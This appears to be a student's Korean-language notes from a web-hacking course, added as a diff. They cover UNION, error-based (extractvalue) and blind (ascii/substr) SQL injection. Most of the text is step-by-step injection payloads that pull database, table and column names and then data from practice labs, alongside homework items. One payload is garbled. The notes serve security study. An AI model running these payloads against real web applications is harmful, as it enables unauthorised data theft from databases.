@@ -1,0 +1,231 @@
+공부할 때 어려운 점
+
+* UNION SQL Injection
+-> 데이터가 한 행만 출력되는 경우.
+
+-> 마이페이지.
+-> 게시판 글 보기 페이지.
+
+limit [index],[count]
+__________________________________________
+
+*UNION SQL Injection
+> 공격 Format 만들기!
+
+'%' union select 1,2,3,4#
+
+__________________________________________
+
+1) SQL 질의 결과가 화면에 출력된다? -> union SQLi
+2) Error 출력될 때 -> Error Based SQL Injection
+
+- 에러 메세지를 활용해서 데이터를 출력.
+
+> 로직 에러(요구조건)
+> SQL 에러(요구조건)
+
+> 문법 에러 / 로직 에러
+
+코드
+컴파일
+
+문법 에러.
+select ~~~
+문법에러는 쓸모가 없음. -> 실행 자체가 안되기 때문
+로직 에러를 써야함
+
+#'normaltic' and (select pass from member limit 0,1) and '1' = '1'
+'normaltic'
+
+* Logic Error를 유발할 수 있는 팁
+mysql, oracle, mssql
+
+extractvalue
+extractvalue(xml데이터, xml 표현식)
+적절한 xpath 표현식이 들어오지 않으면 에러를 출력
+
+'normaltic' and extractvalue('1', ':normaltic') and '1' = '1'
+앞에다가 특수문자를 적으면 바로 에러를 만들 수 있다.
+
+'normaltic' and extractvalue('1', concat(0x3a, (select 'normaltic'))) and '1' = '1'
+여기서 concat이란?
+concat('1','2') =>12
+:
+
+이제 'normaltic' 부분을 원하는 데이터로 바꾸면 원하는 데이터를 출력할 수 있다.
+
+__________________________________________
+* Error Based SQL Injection
+-> 에러 메시지를 활용해서 sql 질의문을 삽입.
+-> 데이터를 추출!
+(select ~)
+
+(select pass from member where id='normaltic')=1
+'1234' = 1
+
+SQL 에러 메세지
+: "1234"는 숫자가 아니에요~
+라고 에러 메세지를 확인 가능
+
+*SELECT 문의 결과를 어떻게 에러 메세지에 포함시킬까?
+mysql, oracle, mssql마다 다 다름
+
+mysqli의 경우
+extractvalue(1,2) -> ('xml 글자','xml 표현식')
+
+/a
+/normaltic
+이런 표현식도 있는데
+:normaltic 이런 표현식은 없음
+
+extractvalue('1',':normaltic')
+
+:normaltic 이 글자는 xml 표현식이 아니에요~
+
+문법 에러가 나면 실행조차 안되기 때문에
+'1' = '1 을 추가로 맞춰줘야함'
+
+'' and extractvalue('1',)
+콜론이나 느낌표 같은 것을 써줘야 에러가 남
+select를 냅다 넣는게 아니라
+앞에다가 colon을 넣기 위해서 concat을 씀
+
+concat('hello','test') -> hellotest
+concat(0x3a, 'test') -> :test
+concat(0x3a, (select 'normaltic'))
+
+__________________________________________
+
+1. SQL Injection Point 찾기
+2. 에러를 출력
+extractvalue
+3. 공격 format 만들기
+normaltic' and extractvalue('1', concat(0x3a, (______))) and '1' = '1
+4. DB이름출력
+-> normaltic' and extractvalue('1', concat(0x3a, (select database()))) and '1' = '1
+5. 테이블 이름
+-> normaltic' and extractvalue('1', concat(0x3a, (select table_name from information_schema.tables where table_schema='segfault_sql' limit 0,1))) and '1' = '1
+
+select table_name from information_schema.tables where table_schema='segfault_sql'
+
+6. 컬럼 이름
+-> normaltic' and extractvalue('1',concat(0x3a, (select column_name from information_schema.columns where table_name='game' limit 0,1))) and '1' = '1
+select column_name from information_schema.columns where table_name='game' limit 0,1
+
+7. 데이터 추출
+
+game 테이블에 있는 name 컬럼을 출력하고 싶다.
+select name from game
+
+'normaltic' and extractvalue('1', concat(0x3a, ('1', concat(0x3a, (select table_name from information_schema.tables where table_schema='errSqli' limit 0,1))))) and '1' = '1
+'
+__________________________________________
+
+(질문) 500 에러는 에러를 제대로 처리를 해주지 않아서 생기는 것임
+에러를 직접 출력해보도록 웹 개발을 하는 것도 도움이 됨
+
+1. sql 질의문 결과가 화면에 출력되는 경우 : UNION SQL
+2. 에러메세지가 화면에 출력되는 경우 : Error Based SQLi
+3. Blind SQL Injection
+
+> 로그인 :
+> 아이디 중복체크
+
+-> 이런 곳에서도 데이터를 빼낼 수 있을까?
+참과 거짓의 응답 차이.
+
+normaltic' and ('1'='1') and '1' = '1
+normaltic' and ('1'='2') and '1' = '1
+(괄호) 조건에 따라 참 거짓이 달라짐
+
+(select pass from member where id='normaltic')
+
+이 결과의 첫번째 글자가 b 맞아?
+-> b
+이구나!
+
+__________________________________________
+
+1. SQL Injection Point 찾기
+normaltic' and '1' = '1
+normaltic' and '1' = '2
+참인 경우와 거짓인 경우가 다르면 blind SQL Injection 가능
+
+2. SELECT 문구 사용
+normaltic' and (select'test'='test') and '1' = '1
+select가 먹히는지
+
+(select 'test') = 'test'
+
+3. 공격 format
+normaltic' and (__조건__) and '1' = '1
+
+substr() -> 글자를 잘라주는 함수
+substr('test',1,1) = 't' <- substr('test',시작인덱스, 자를 인덱스 개수)
+
+substr((__SQL__),1,1)
+
+normaltic' and (substr((select 'test'),1,1)='t') and '1' = '1
+
+글자 -> 숫자.
+ascii('a') = 97
+ascii(substr((select 'test'),1,1)) > 0
+
+normaltic' and (ascii(substr((select 'normaltic'),1,1)) > 0) and '1' = '1
+
+33부터 126?까지 돌려봄
+burp suite - repeater를 돌림 -> auto scroll을 존재하는 아이디입니다.에 설정
+
+*우리가 만든 공격 format
+normaltic' and (ascii(substr((__SQL__),1,1)) > 0) and '1' = '1
+
+
+4. DB명 찾기
+: select database()
+normaltic' and (ascii(substr((select database()),1,1)) > 0) and '1' = '1
+
+똑같이 진행
+한글자씩 찾아내는 것임
+
+5. Table명 찾기
+select table_name from information_schema.tables where table_schema='segfault_sql'
+
+normaltic' and (ascii(substr((select table_name from information_schema.tables where table_schema='segfault_sql'),1,1)) > 0) and '1' = '1
+
+6. Column 이름
+select column_name from information_schema.columns where table_name='game' limit 0,1
+
+normaltic' and (ascii(substr((select column_name from information_schema.columns where table_name='game' limit 0,1),1,1)) > 0) and '1' = '1
+
+7. 데이터 추출
+
+______
+blind SQL Injection
+수작업으로 꼭!
+(프로그래밍 안쓰고)
+
+SQL Injection (Blind Practice) 는 수작업으로 풀어보기
+
+__________________________________________
+* 당부!
+> 수업 끝나고! 오늘 할거 하고 자기!
+>
+
+* 오늘 과제 : Today 과제
+1. Error Based SQLi 정리 & 연습문제 풀기
+[SQL Injection (Error Based SQLi Basic)]
+
+2. Blind SQLi 정리 & 연습문제 풀기
+[SQL Injection (Blind Practice)]
+-수동-
+
+* 이번주 과제
+1. SQL Injection : 데이터 추출 총 정리
+2. SQL Injection 문제 풀어보기!
+-write up
+
+3. 웹 사이트 개발과제
+> 게시판
+게시글 리스트 보여주는 페이지
+게시글 상세 내용 보여주는 페이지
+게시글 작성 페이지
